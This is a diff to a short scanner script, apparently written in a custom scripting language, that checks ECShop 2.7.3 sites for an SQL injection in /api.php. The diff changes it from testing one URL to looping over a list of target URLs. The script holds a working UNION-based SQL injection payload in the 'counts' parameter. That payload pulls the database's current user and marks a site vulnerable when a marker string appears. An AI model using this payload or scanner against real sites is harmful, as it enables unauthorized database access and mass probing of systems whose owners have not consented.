@@ -1,13 +1,23 @@
-#request url = var
+#request urls = array
 #define payload = /api.php?last_modify_en_time=1&ac=1&counts=1+UNION+ALL+SELECT+NULL%2CCONCAT%280x666630303030%2CIFNULL%28CAST%28CURRENT_USER%28%29AS+CHAR%29%2C0x20%29%2C0x20%29%23&act=search_goods_list&return_data=json&last_modify_st_time=1&pages=1&api_version=1.0
 #define bug = ff0000
 #define info = /api.php?last_modify_en_time=1&ac=1&counts=1+UNION+ALL+SELECT+NULL%2CCONCAT%280x666630303030%2CIFNULL%28CAST%28CURRENT_USER%28%29AS+CHAR%29%2C0x20%29%2C0x20%29%23&act=search_goods_list&return_data=json&last_modify_st_time=1&pages=1&api_version=1.0|在ecshop 2.7.3 /api.php SQL注入漏洞
 
 function main(args)
 {
-	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],bug,0)!= "-1")
-	{
-		print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
 }
